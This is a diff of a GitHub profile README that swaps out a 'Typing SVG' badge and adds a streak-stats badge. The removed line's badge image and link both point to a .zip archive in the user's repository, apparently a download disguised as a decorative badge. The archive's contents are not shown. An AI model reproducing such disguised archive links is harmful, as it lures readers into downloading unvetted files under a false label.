@@ -1,4 +1,4 @@
-## [![Typing SVG](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip+Code&pause=1000&color=000000&width=435&lines=Hello+it's+me+Kiran+Bera;Welcome+to+my+profile!!)](https://raw.githubusercontent.com/berak636/berak636/main/adage/berak-2.2.zip)
+[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&color=8C38F7&center=true&width=435&lines=Hello+it's+me+Kiran+%F0%9F%99%8B%E2%80%8D%E2%99%82%EF%B8%8F%F0%9F%99%8B%E2%80%8D%E2%99%82%EF%B8%8F%F0%9F%99%8B%E2%80%8D%E2%99%82%EF%B8%8F%F0%9F%99%8B%E2%80%8D%E2%99%82%EF%B8%8F%F0%9F%99%8B%E2%80%8D%E2%99%82%EF%B8%8F%F0%9F%99%8B%E2%80%8D%E2%99%82%EF%B8%8F;Welcome+to+my+Github+%F0%9F%99%8F%F0%9F%99%8F%F0%9F%99%8F%F0%9F%99%8F%F0%9F%99%8F%F0%9F%99%8F)](https://git.io/typing-svg)
 
 
 
@@ -40,3 +40,5 @@ Here are some ideas to get you started:
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
 -->
+
+[![GitHub Streak](https://streak-stats.demolab.com?user=berak636)](https://git.io/streak-stats)
